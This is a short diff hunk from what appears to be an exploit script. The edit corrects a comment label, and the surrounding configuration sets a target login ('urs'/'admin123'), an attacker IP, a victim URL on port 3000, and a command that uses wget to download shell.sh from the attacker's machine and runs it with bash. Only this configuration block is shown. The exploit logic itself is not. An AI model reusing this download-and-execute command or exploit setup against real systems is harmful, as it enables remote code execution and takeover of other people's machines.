@@ -44,7 +44,7 @@ from functools import partial
 
 USERNAME = "urs"                                                    # Account Username
 PASSWORD = "admin123"                                               # Account Password
-HOST_ADDR = '192.168.49.68'                                         # LPORT -- Attacker's Machine                              
+HOST_ADDR = '192.168.49.68'                                         # LHOST -- Attacker's Machine                              
 HOST_PORT = 3000                                                    # RPORT -- Victim PORT
 URL = 'http://192.168.68.67:3000'                                   # URL of the application + port                                                                                                                                 
 CMD = 'wget http://192.168.49.68:21/shell.sh && bash shell.sh'      # Address of your server from which the payload shell.sh will run                                                                                                       
